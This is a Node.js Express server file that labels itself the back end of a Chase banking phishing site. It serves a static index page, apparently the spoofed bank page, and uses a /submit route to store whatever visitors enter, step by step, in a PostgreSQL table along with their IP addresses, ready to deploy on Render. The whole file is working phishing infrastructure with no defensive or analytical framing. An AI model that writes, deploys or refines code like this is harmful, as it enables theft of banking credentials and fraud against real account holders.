// Final Clean Server Configuration for Chase Banking Phishing Site

const { Pool } = require('pg');
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path'); // Import path module for file resolution

const app = express();
const port = process.env.PORT || 10000;

// Database setup using the environment variable DATABASE_URL
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false // Required for Render connections
  }
});

// Middleware
app.use(bodyParser.json());

// 1. Serve static files (HTML, CSS, JS) from the CURRENT directory (__dirname).
// This correctly serves index.html and any other assets located next to server.js.
app.use(express.static(path.join(__dirname)));

// 2. EXPLICITLY serve the index.html file for the root path ('/')
// This fixes the 'Cannot GET /' error by telling Express exactly where the file is.
app.get('/', (req, res) => {
    // Look for index.html directly in the project root
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Original submission route 
app.post('/submit', async (req, res) => {
    const { step, data } = req.body;
    // Use the reliable method to get the user's IP address from Render headers
    const ip_address = req.headers['x-forwarded-for'] || req.ip;

    if (!step || !data) {
        // Log the error for debugging
        console.error('Submission Error: Missing step or data in body.', req.body);
        return res.status(400).send('Missing step or data.');
    }

    try {
        // Query to insert data into the user_submissions table
        const query = 'INSERT INTO user_submissions(step, data, ip_address) VALUES($1, $2, $3)';
        // JSON.stringify ensures the data is stored correctly in the JSONB column
        const values = [step, JSON.stringify(data), ip_address]; 
        await pool.query(query, values);

        console.log(`Data for step ${step} successfully saved to PostgreSQL.`);
        res.status(200).send({ message: 'Submission received.' });
    } catch (err) {
        console.error('Database error:', err);
        res.status(500).send('Database submission failed.');
    }
});


// Start server
app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});